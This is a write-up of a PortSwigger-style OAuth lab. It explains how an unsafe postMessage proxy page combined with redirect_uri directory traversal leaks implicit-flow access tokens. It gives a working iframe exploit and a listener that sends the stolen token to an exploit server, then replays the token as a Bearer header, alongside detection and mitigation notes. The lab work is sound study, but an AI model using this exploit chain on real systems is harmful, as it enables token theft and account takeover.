# Lab 06 - Stealing OAuth Access Tokens via a Proxy Page

## Lab Information

**Difficulty:** Practitioner

**Category**

- OAuth
- Implicit Flow
- postMessage
- Proxy Page
- Access Token Theft
- DOM Security

---

# Lab Objective

Steal the administrator's OAuth access token by abusing an insecure proxy page.

Use the stolen token to retrieve the administrator's API key and solve the lab.

---

# Vulnerability

The OAuth provider correctly restricts the `redirect_uri` to trusted pages.

However, one trusted page contains insecure JavaScript that forwards the entire URL to its parent window using `postMessage()` without validating the destination.

This creates a **proxy page** that leaks the OAuth access token.

---

# Root Cause

The application combines two issues:

```
Directory Traversal

+

Unsafe postMessage()
```

The callback can be redirected to the vulnerable page, which then forwards the access token to an attacker-controlled parent window.

---

# Vulnerable JavaScript

Example:

```javascript
window.parent.postMessage(window.location.href, "*");
```

Problems:

- Sends the full URL
- Includes the access token in the fragment
- Uses `"*"` as the target origin
- Does not verify the recipient

---

# Attack Flow

```
Victim

↓

OAuth Authorization

↓

redirect_uri

↓

Directory Traversal

↓

Comment Form

↓

postMessage()

↓

Attacker Page

↓

Access Token Stolen
```

---

# Why It Works

OAuth sends the access token to a trusted page.

Instead of processing it securely, the page executes:

```
window.parent.postMessage()
```

Because the parent window is attacker-controlled, the token is leaked.

---

# Burp Analysis

Capture:

```
GET /auth
```

Notice:

```
response_type=token
```

indicating the Implicit Flow.

---

# Discovery Phase

## Step 1

Modify:

```
redirect_uri
```

using directory traversal:

```
/oauth-callback/../post/comment/comment-form
```

The OAuth provider still accepts the request because the domain remains trusted.

---

## Step 2

Inspect:

```
/post/comment/comment-form
```

Observe JavaScript similar to:

```javascript
window.parent.postMessage(window.location.href, "*");
```

The page sends the full URL—including the fragment—to its parent.

---

# Exploitation Steps

## Step 1

Create an iframe pointing to the manipulated OAuth authorization URL.

```html
<iframe src="https://oauth-server.net/auth?..."></iframe>
```

The callback targets the vulnerable comment form.

---

## Step 2

Create a message listener.

```javascript
window.addEventListener("message", function(e){

fetch("/" + encodeURIComponent(e.data));

});
```

This listener receives the message from the iframe and sends it to the exploit server.

---

## Step 3

Deliver the exploit.

The administrator opens the page.

---

## Step 4

OAuth Flow

```
Administrator

↓

OAuth Login

↓

Access Token

↓

Comment Form

↓

postMessage()

↓

Attacker Listener

↓

Exploit Server
```

---

## Step 5

Access logs now contain:

```
https://target/post/comment/comment-form

#access_token=eyJhb...
```

Extract only:

```
access_token
```

---

## Step 6

Replay the token.

```http
GET /me

Authorization:
Bearer STOLEN_TOKEN
```

---

## Step 7

Resource Server returns:

```json
{
    "username":"administrator",
    "apikey":"****************"
}
```

Submit the API key.

Lab solved.

---

# Complete Attack Diagram

```
Victim

↓

OAuth Login

↓

Access Token

↓

Directory Traversal

↓

Comment Form

↓

postMessage()

↓

Attacker

↓

Exploit Server

↓

GET /me

↓

Admin API Key
```

---

# Why postMessage Is Dangerous

`postMessage()` is designed for secure communication between windows.

It becomes dangerous when:

- Sensitive data is transmitted
- `targetOrigin` is `"*"`
- The receiving window is not validated
- The sender transmits `window.location.href`

---

# Detection Checklist

Look for pages containing:

```javascript
window.postMessage()

window.parent.postMessage()

window.location.href

location.hash
```

Questions:

- Is `targetOrigin` `"*"`?
- Is the receiver validated?
- Does the message include the URL?
- Can the page be used as an OAuth callback?
- Can the callback path be manipulated?

---

# Bug Bounty Methodology

Whenever testing OAuth:

1. Identify the callback page.
2. Search for pages that use `postMessage()`.
3. Test whether `redirect_uri` can reach those pages.
4. Inspect whether URL fragments are exposed.
5. Determine whether messages are sent to arbitrary origins.

---

# Impact

```
Access Token Theft

↓

Sensitive Data Disclosure

↓

API Key Disclosure

↓

Account Takeover

↓

Privilege Escalation
```

---

# Mitigation

- Use the Authorization Code Flow with PKCE instead of the Implicit Flow.
- Never send `window.location.href` via `postMessage()`.
- Specify an exact `targetOrigin` instead of `"*"`.
- Validate the receiving origin before sending sensitive data.
- Prevent directory traversal in callback paths.
- Restrict OAuth callback pages to dedicated endpoints.

---

# Personal Learning

This lab demonstrates that OAuth vulnerabilities often arise from chaining multiple smaller issues. A trusted callback page combined with unsafe client-side messaging can expose access tokens, even when the OAuth provider correctly restricts the callback domain.

---

# PortSwigger Skills Learned

- OAuth Implicit Flow
- Directory Traversal
- postMessage Exploitation
- DOM Security
- Proxy Page Abuse
- Access Token Theft
- Burp Suite Analysis
- API Token Replay